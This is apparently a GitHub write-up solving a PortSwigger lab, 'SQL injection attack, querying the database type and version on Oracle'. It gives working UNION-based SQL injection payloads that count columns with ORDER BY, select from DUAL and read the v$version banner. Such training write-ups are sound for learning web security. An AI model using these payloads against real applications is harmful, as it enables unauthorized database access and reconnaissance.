## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/48bada6740530f9d3cd5f85919d71d9708a8a2cb/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20Oracle/Images/Lab%20Description.png)

![image]()


## Solution :

Here we can find out the number of columns that the web app is querying & also determine the columns which have text data but to retreive a column data  we need to know the table name.

> In oracle there is a default table called **DUAL**. Using that we can retreive column data.

#### Determine the number of columns 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

**ORDER BY 3** gives error, so there are 2 columns being retreived.

#### Determine the column which has text data


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'shebu','cys' FROM dual --
```
Both the columns show the text in response. So both columns support text data.

#### Retreive db type & version of ORACLE 

To retretive db type & version of ORACLE , we have the syntax `SELECT * FROM v$version`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --
```

We got the db info we needed.

![image]()

![image]()

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/3f3225b268066b63e9646226e527fabf73f6a8a9/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20Oracle/Images/Lab%20Solution.png)

